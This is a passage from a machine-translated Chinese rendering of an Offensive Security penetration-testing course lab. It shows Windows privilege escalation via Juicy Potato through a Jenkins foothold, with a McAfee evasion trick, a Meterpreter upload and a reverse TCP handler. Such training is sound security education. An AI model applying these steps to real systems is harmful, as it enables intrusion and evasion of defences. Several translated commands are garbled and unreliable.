<div style="position:absolute;top:37685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关机权限    </font></font></nobr></div>
<div style="position:absolute;top:37685;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭系统    </font></font></nobr></div>
<div style="position:absolute;top:37685;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:37702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeChangeNotifyPrivilege 绕过遍历检查    </font></font></nobr></div>
<div style="position:absolute;top:37702;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用 </font></font></nobr></div>
<div style="position:absolute;top:37719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeUndock权限    </font></font></nobr></div>
<div style="position:absolute;top:37719;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从扩展坞移除计算机已禁用</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:37736;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模拟权限    </font></font></b></nobr></div>
<div style="position:absolute;top:37736;left:352"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证后模拟客户端已启用</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeCreateGlobalPrivilege 创建全局对象    </font></font></nobr></div>
<div style="position:absolute;top:37753;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用 </font></font></nobr></div>
<div style="position:absolute;top:37770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeIncreaseWorkingSetPrivilege 增加一个进程工作集    </font></font></nobr></div>
<div style="position:absolute;top:37770;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:37787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时区权限    </font></font></nobr></div>
<div style="position:absolute;top:37787;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改时区    </font></font></nobr></div>
<div style="position:absolute;top:37787;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:37806;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 992 - 检查用户权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数特权似乎是标准的，但</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeImpersonatePrivilege</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脱颖而出。</font><font style="vertical-align: inherit;">说明</font></font></nobr></div>
<div style="position:absolute;top:37855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声明它允许我们“在身份验证后模拟客户端”。</font><font style="vertical-align: inherit;">我们会做一个心理记录</font></font></nobr></div>
<div style="position:absolute;top:37874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着我们继续列举，这一许可。</font></font></nobr></div>
<div style="position:absolute;top:37907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以收集一些关于系统的基本信息，看看我们是什么版本的操作系统</font></font></nobr></div>
<div style="position:absolute;top:37927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在运行以及 Cevapi 处于什么补丁级别。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files (x86)\Jenkins\workspace\Access&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systeminfo</font></font></font></b></nobr></div>
<div style="position:absolute;top:37979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统信息</font></font></nobr></div>
<div style="position:absolute;top:38012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名：    </font></font></nobr></div>
<div style="position:absolute;top:38012;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CEVAPI</font></font></nobr></div>
<div style="position:absolute;top:38029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统名称：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:38029;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗 10 专业版</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:38046;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.0.15063 不适用 内部版本 15063</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统制造商：    </font></font></nobr></div>
<div style="position:absolute;top:38064;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软公司 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:38191;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="33"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 33 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38224;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:39301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:39301;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:39301;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">842</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统配置：    </font></font></nobr></div>
<div style="position:absolute;top:38320;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会员工作站</font></font></nobr></div>
<div style="position:absolute;top:38336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:38353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面文件位置：C:\pagefile.sys</font></font></nobr></div>
<div style="position:absolute;top:38370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:38370;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒.local</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录服务器：    </font></font></nobr></div>
<div style="position:absolute;top:38388;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不适用</font></font></nobr></div>
<div style="position:absolute;top:38404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修补程序：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:38404;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 个修补程序已安装。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38421;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[01]：KB4515840</font></font></nobr></div>
<div style="position:absolute;top:38438;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[02]：KB4073543</font></font></nobr></div>
<div style="position:absolute;top:38455;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[03]：KB4091663</font></font></nobr></div>
<div style="position:absolute;top:38472;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[04]：KB4134660</font></font></nobr></div>
<div style="position:absolute;top:38489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:38509;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 993 - 检查系统信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据输出，我们可以得出 Cevapi 在 Windows 10 专业版 15063 上运行。</font></font></nobr></div>
<div style="position:absolute;top:38557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据 Windows 10 版本历史，build 15063 于 2017 年 4 月 5 日发布。我们将</font></font></nobr></div>
<div style="position:absolute;top:38576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，此版本的 Windows 不是最新版本。</font><font style="vertical-align: inherit;">我们还发现它有八个</font></font></nobr></div>
<div style="position:absolute;top:38596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已安装修补程序。</font><font style="vertical-align: inherit;">如果我们试图通过利用</font></font></nobr></div>
<div style="position:absolute;top:38615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 操作系统漏洞。</font><font style="vertical-align: inherit;">我们还看到此目标已加入域。</font></font></nobr></div>
<div style="position:absolute;top:38648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeImpersonate</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权。</font><font style="vertical-align: inherit;">在 Google 上快速搜索“提升特权”</font></font></nobr></div>
<div style="position:absolute;top:38668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeImpersonate”允许我们发现一个名为“Juicy Potato”的漏洞利用。</font><font style="vertical-align: inherit;">多汁土豆</font></font></nobr></div>
<div style="position:absolute;top:38687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将自己描述为“另一个本地权限提升工具，从 Windows 服务帐户到</font></font></nobr></div>
<div style="position:absolute;top:38706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\系统”。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">748</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这听起来正是我们所需要的，因此让我们深入挖掘一下。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:38741;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.4</font></font></i></nobr></div>
<div style="position:absolute;top:38741;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限提升</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Juicy Potato 源代码可以在 github 页面上找到：https://github.com/ohpe/juicy-</font></font></nobr></div>
<div style="position:absolute;top:38798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">土豆。</font><font style="vertical-align: inherit;">Juicy Potato 是用 Visual Studio 编写的，可以编译。</font><font style="vertical-align: inherit;">审查后</font></font></nobr></div>
<div style="position:absolute;top:38817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码，我们没有发现任何引起关注的东西，所以我们可以认为这个漏洞是可以安全运行的</font></font></nobr></div>
<div style="position:absolute;top:38837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反对我们的目标。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:38899;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Juicy Potato 二进制文件可以直接从 GitHub 页面下载，</font></font></i></nobr></div>
<div style="position:absolute;top:38918;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们建议学生在学习后习惯于编译自己的二进制文件</font></font></i></nobr></div>
<div style="position:absolute;top:38938;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">审查源代码，作为一种好的和更安全的做法。</font></font></i></nobr></div>
<div style="position:absolute;top:38984;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，公开可用的二进制文件很容易被恶意软件检测到</font></font></i></nobr></div>
<div style="position:absolute;top:39003;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室中使用的 McAfee AV 解决方案。</font><font style="vertical-align: inherit;">因此，我们首先需要确定</font></font></i></nobr></div>
<div style="position:absolute;top:39023;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有问题的字节并验证我们可以绕过检测</font></font></i></nobr></div>
<div style="position:absolute;top:39042;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改。</font><font style="vertical-align: inherit;">使用文件拆分技术在稍微的帮助下</font></font></i></nobr></div>
<div style="position:absolute;top:39061;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改后的 Python 脚本，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">749</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们意识到 AV 签名是基于</font></font></i></nobr></div>
<div style="position:absolute;top:39080;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含生成的 PDB 文件路径的嵌入字符串。</font><font style="vertical-align: inherit;">由于这是一个</font></font></i></nobr></div>
<div style="position:absolute;top:39100;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译过程的神器，规避相当简单：我们只是</font></font></i></nobr></div>
<div style="position:absolute;top:39119;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译了没有 /DEBUG 标志的 JuicyPotato 源代码。</font><font style="vertical-align: inherit;">这是</font></font></i></nobr></div>
<div style="position:absolute;top:39138;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">足以绕过 McAfee 检测，因此我们将使用我们的二进制文件</font></font></i></nobr></div>
<div style="position:absolute;top:39158;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已编译，可以在实验室中的 Windows 10 PWK 客户端 VM 上找到。</font><font style="vertical-align: inherit;">如果</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:39231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">748 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Andrea Pierini, Giuseppe Trotta, 2019), https://ohpe.it/juicy-potato/</font></font></font></nobr></div>
<div style="position:absolute;top:39251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">749 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Github，2013 年），https://github.com/rzwck/pydsplit/blob/master/pydsplit.py</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:39379;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="34"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 34 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39412;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:40489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:40489;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:40489;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">843</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:39508;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以访问 Visual Studio，您可以尝试编译漏洞利用</font></font></i></nobr></div>
<div style="position:absolute;top:39527;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你自己。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 JuicyPotato.exe 被转移到我们的 Kali 机器上，我们就可以使用我们现有的 Meterpreter shell</font></font></nobr></div>
<div style="position:absolute;top:39609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其上传到 Cevapi。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files (x86)\Jenkins\workspace\Access&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:39677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传 /home/kali/cevapi/JuicyPotato.exe c:/Users/Public/JuicyPotato.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:39694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/home/kali/cevapi/JuicyPotato.exe -&gt; c:/Users/Public/JuicyPotato.exe</font></font></nobr></div>
<div style="position:absolute;top:39711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传 339.50 KiB (100.0%): /home/kali/cevapi/JuicyPotato.exe -&gt; c:/Users/Public</font></font></nobr></div>
<div style="position:absolute;top:39728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/JuicyPotato.exe</font></font></nobr></div>
<div style="position:absolute;top:39745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/home/kali/cevapi/JuicyPotato.exe -&gt; c:/Users/Public/JuicyPotato.exe</font></font></nobr></div>
<div style="position:absolute;top:39762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:39782;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 994 - JuicyPotato.exe 上传到 Cevapi</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JuicyPotato.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前</font><font style="vertical-align: inherit;">，我们必须建立一些强制性参数。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:39830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档指出我们需要提供三个强制性参数：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">750</font></font></font></nobr></div>
<div style="position:absolute;top:39863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个必需的标志 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 是“进程创建模式”。</font><font style="vertical-align: inherit;">文档说明我们需要</font></font></nobr></div>
<div style="position:absolute;top:39883;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateProcessWithToken</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeImpersonate</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限，我们就是这样做的。</font><font style="vertical-align: inherit;">指导多汁</font></font></nobr></div>
<div style="position:absolute;top:39902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Potato 使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateProcessWithToken</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将传递</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">t</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值。</font></font></nobr></div>
<div style="position:absolute;top:39935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志指定我们尝试运行的程序。</font><font style="vertical-align: inherit;">在这种情况下，我们可以使用相同的</font></font></nobr></div>
<div style="position:absolute;top:39954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们之前使用的后门 whoami.exe 二进制文件。</font></font></nobr></div>
<div style="position:absolute;top:39987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，Juicy Potato 允许我们为 COM 服务器指定一个任意端口来监听</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:40007;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们鼓励您阅读有关此攻击背后的机制和工具本身的更多信息，但对于</font></font></nobr></div>
<div style="position:absolute;top:40059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们将放入 Jenkins 的最后一个命令可以在清单 995 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Public\JuicyPotato.exe -tt -p C:\Users\Public\whoami.exe -l 5837</font></font></nobr></div>
<div style="position:absolute;top:40113;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 995 - JuicyPotato 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将当前的 Meterpreter 会话作为后台并启动一个新的侦听器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:40194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></nobr></div>
<div style="position:absolute;top:40228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景</font></font></font></b></nobr></div>
<div style="position:absolute;top:40245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 背景会话 1...</font></font></nobr></div>
<div style="position:absolute;top:40279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:40313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:80 启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:40332;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 996 - 后台处理 Meterpreter 会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们将在 Jenkins 中编辑 Item 配置以运行 Juicy Potato 命令。</font><font style="vertical-align: inherit;">我们也</font></font></nobr></div>
<div style="position:absolute;top:40381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须选中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Execute concurrent builds if needed</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复选框以允许我们同时运行旧的</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:40439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">750 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Giuseppe Trotta, 2019), https://github.com/ohpe/juicy-potato#</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:40567;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="35"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 35 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40600;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:41677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:41677;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:41677;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">844</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一次构建和新构建。</font><font style="vertical-align: inherit;">虽然这不是必需的，但最好回退到旧的</font></font></nobr></div>
<div style="position:absolute;top:40715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果需要，可以使用低权限 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41378;left:275"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 372：配置批处理命令以运行 Juicy Potato</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
